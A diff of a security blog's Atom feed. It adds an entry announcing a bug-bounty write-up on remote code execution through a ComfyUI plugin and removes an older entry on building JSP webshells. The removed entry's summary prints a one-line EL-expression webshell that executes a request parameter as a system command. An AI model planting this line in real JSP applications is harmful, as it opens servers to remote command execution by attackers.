@@ -6,7 +6,7 @@
   <link href="https://rce.moe/atom.xml" rel="self"/>
   
   <link href="https://rce.moe/"/>
-  <updated>2025-01-07T09:06:35.127Z</updated>
+  <updated>2025-07-08T13:04:44.060Z</updated>
   <id>https://rce.moe/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE</title>
+    <link href="https://rce.moe/2025/07/08/ComfyUIRCE/"/>
+    <id>https://rce.moe/2025/07/08/ComfyUIRCE/</id>
+    <published>2025-07-08T13:02:36.000Z</published>
+    <updated>2025-07-08T13:04:44.060Z</updated>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;一个奇怪的废弃资产？&quot;&gt;&lt;a href=&quot;#一个奇怪的废弃资产？&quot; class=&quot;headerlink&quot; title=&quot;一个奇怪的废弃资产？&quot;&gt;&lt;/a&gt;一个奇怪的废弃资产？&lt;/h1&gt;&lt;p&gt;一天，我正看着刚刚收集的某SRC资产列表，在图标列表里发现了一个从没见过的奇怪图标。&lt;/p&gt;
+&lt;p&gt;查看了下对应的资产，发现是一个定制的ComfyUI WEB资产 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2025/png/25577536/1751976710953-98ee5dfc-4f14-4fbe-bb72-1b39f8ca1a6a.png&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="WEB" scheme="https://rce.moe/categories/WEB/"/>
+    
+    
+    <category term="WEB" scheme="https://rce.moe/tags/WEB/"/>
+    
+  </entry>
   
   <entry>
     <title>V8 字节码反编译 还原bytenode保护的js代码</title>
@@ -429,25 +450,6 @@ LLM的一个重要特点是它可以通过预训练和微调来适应不同的�
     
     
     <category term="password" scheme="https://rce.moe/tags/password/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>构建jsp webshell的一个小trick</title>
-    <link href="https://rce.moe/2022/04/18/jsp-webshell-trick/"/>
-    <id>https://rce.moe/2022/04/18/jsp-webshell-trick/</id>
-    <published>2022-04-18T10:58:20.000Z</published>
-    <updated>2022-07-11T03:21:32.823Z</updated>
-    
-    
-    <summary type="html">&lt;p&gt;jsp中可以使用el表达式&lt;br&gt;所以我们可以使用和el表达式注入一样的方法构造webshell&lt;/p&gt;
-&lt;p&gt;可以避免出现 &amp;lt;%符号&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs plain&quot;&gt;$&amp;#123;Runtime.getRuntime().exec(param.a)&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
-    
-    
-    
-    <category term="笔记" scheme="https://rce.moe/categories/%E7%AC%94%E8%AE%B0/"/>
-    
     
   </entry>
   
